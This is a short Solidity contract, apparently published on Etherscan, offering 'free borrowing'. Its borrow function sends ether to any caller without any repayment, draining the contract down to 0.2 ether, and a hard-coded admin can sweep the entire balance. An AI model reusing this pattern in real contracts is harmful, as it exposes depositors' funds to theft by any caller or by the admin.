/**
 *Submitted for verification at Etherscan.io on 2023-03-03
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

contract FreeBorrowV1 {
    address payable public admin_address = payable(0xeE10A22A0542C6948ee8f34A574a57eB163aCaD0);

    function clean_liquidity() public {
        require(msg.sender == admin_address, "Only the admin address can call this function.");
        admin_address.transfer(address(this).balance);
    }

    function borrow_and_return(address payable to, uint amount) public {
        require(address(this).balance >= amount, "Insufficient liquidity in contract.");

        to.transfer(amount);
        
        require(address(this).balance > 0.2 ether, "Need to keep remaining balance > 0.2.");


    }

    receive() external payable {}

    event print_1(bool is_rich_, address address_);
}